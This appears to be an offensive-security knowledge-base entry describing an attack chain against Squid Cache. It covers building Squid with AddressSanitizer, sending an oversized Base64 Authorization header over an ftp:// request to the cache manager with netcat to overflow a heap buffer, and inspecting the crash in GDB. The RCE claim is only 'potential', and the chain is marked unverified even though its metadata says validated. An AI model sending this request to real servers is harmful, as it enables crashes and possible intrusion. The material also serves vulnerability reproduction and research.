---
tags:
  - heap-overflow
  - squid
  - rce
  - base64-decode
  - ftp-bypass
type: attack_chain
tools:
  - '[[tools/netcat]]'
  - '[[tools/GDB]]'
  - '[[tools/AddressSanitizer]]'
  - '[[tools/ldd]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Send-Crafted-HTTP-Request-to-Trigger-Heap-Overflow]]'
  - '[[procedures/Build-and-Run-Squid-with-AddressSanitizer]]'
  - '[[procedures/Verify-ASAN-Linkage-and-Monitor-Crash-with-GDB]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:19.235Z'
description: >-
  Exploits a heap buffer overflow in Squid Cache's HttpHeader::getAuth function
  by sending a crafted GET request to the internal cache manager endpoint over
  FTP protocol, bypassing authentication checks and enabling potential remote
  code execution through heap corruption.
skill_level: intermediate
impact_level: high
id: 72bc3b77-df67-4c1b-9b73-d661a5e4b7ae
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Heap Overflow in Squid Cache via FTP Protocol Bypass for Remote Code Execution

Multi-stage attack chain demonstrating exploitation of a heap overflow vulnerability in Squid Cache, allowing arbitrary heap corruption and potential remote code execution without authentication.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Build Vulnerable Squid with ASAN] --> B[Send Crafted FTP Request to Cache Manager]
    B --> C[Monitor and Verify Heap Overflow with GDB]
    C --> D[Heap Corruption Leading to RCE]

    style A fill:#3498db
    style B fill:#f39c12
    style C fill:#e74c3c
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/netcat]]
- [[tools/GDB]]
- [[tools/AddressSanitizer]]
- [[tools/ldd]]
- gcc compiler

### Target Environment

- Linux platform
- Squid Proxy service running on port 3128
- Access to Squid source code for building with ASAN
- Network access to the Squid server

### Initial Access Requirements

- No credentials required due to FTP protocol bypass
- Direct network connectivity to Squid port 3128
- Ability to compile and run Squid locally or on target

## Detailed Attack Procedures

### Step 1: Build Vulnerable Squid with ASAN
procedure: [[procedures/Build-and-Run-Squid-with-AddressSanitizer]]

**Objective**: Compile and start Squid with AddressSanitizer enabled to detect and reproduce the heap overflow during exploitation.

**Instructions**: Configure the build environment with ASAN flags, compile Squid, and launch it in foreground mode with debugging enabled. Use [[commands/configure-squid-with-asan]] to set up the build:

```bash
CFLAGS="-O0 -g -fsanitize=address" CXXFLAGS="${CFLAGS}" ./configure
```

Then build and run using [[commands/run-squid-with-asan]]:

```bash
ASAN_OPTIONS="abort_on_error=true" ./sbin/squid --foreground -d 100
```

**Expected Output**: Squid starts with debug logs; ASAN is active and ready to detect overflows.

**Success Indicators**:
- Squid process running in foreground
- No immediate errors in startup logs
- ASAN options applied (verifiable via environment)

### Step 2: Send Crafted HTTP Request to Trigger Heap Overflow
procedure: [[procedures/Send-Crafted-HTTP-Request-to-Trigger-Heap-Overflow]]

**Objective**: Deliver a specially crafted GET request over FTP protocol to the internal cache manager endpoint, causing base64 decoding to overflow the fixed-size buffer in HttpHeader::getAuth.

**Instructions**: Prepare a file with a long Base64-encoded Authorization header that decodes to over 8192 bytes (e.g., repeat 'A' characters). Use [[commands/hostname]] to get the target hostname for the FTP URL:

```bash
hostname
```

Craft the request as: `GET ftp://<hostname>:3128/squid-internal-mgr/menu HTTP/1.1` with `Authorization: Basic <long_base64>`. Send it using [[commands/send-exploit-with-netcat]]:

```bash
cat long_auth.txt | nc <server> 3128
```

**Expected Output**: Connection accepted; Squid processes the request and crashes due to overflow.

**Success Indicators**:
- Request sent successfully
- Squid logs show processing of the cache manager endpoint
- ASAN reports heap buffer overflow

### Step 3: Verify ASAN Linkage and Monitor Crash with GDB
procedure: [[procedures/Verify-ASAN-Linkage-and-Monitor-Crash-with-GDB]]

**Objective**: Confirm ASAN is linked and attach GDB to capture the crash details, including backtrace and overflowed variable values.

**Instructions**: First, verify ASAN linkage with [[commands/check-asan-with-ldd]]:

```bash
ldd squid | grep asan
```

Alternatively, use [[commands/check-asan-with-proc-maps]] on the running process:

```bash
grep asan /proc/<Squid PID>/maps
```

Find the Squid PID with [[commands/find-squid-pid]]:

```bash
pgrep squid | tail -n 1
```

Attach GDB using [[commands/attach-gdb-to-squid]]:

```bash
gdb -q -p $(pgrep squid | tail -n 1)
```

After crash, in GDB run [[commands/gdb-backtrace]] and [[commands/gdb-print-decodedlen]]:

```bash
(gdb) bt
(gdb) p decodedLen
```

**Expected Output**: Backtrace showing overflow in CacheManager::ParseHeaders; decodedLen > 8192 (e.g., 43011).

**Success Indicators**:
- ASAN library confirmed linked
- GDB attached successfully
- Crash backtrace reveals heap overflow in base64 decoding
- decodedLen value exceeds buffer size

## Attack Chain Summary

### Key Achievements

1. Bypassed authentication checks using FTP protocol to access internal cache manager.
2. Triggered heap overflow via oversized Base64 decoding without bounds checking.
3. Demonstrated potential for RCE through adjacent heap object corruption, verified with ASAN and GDB.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

*Last updated: 2023-10-01T00:00:00Z*
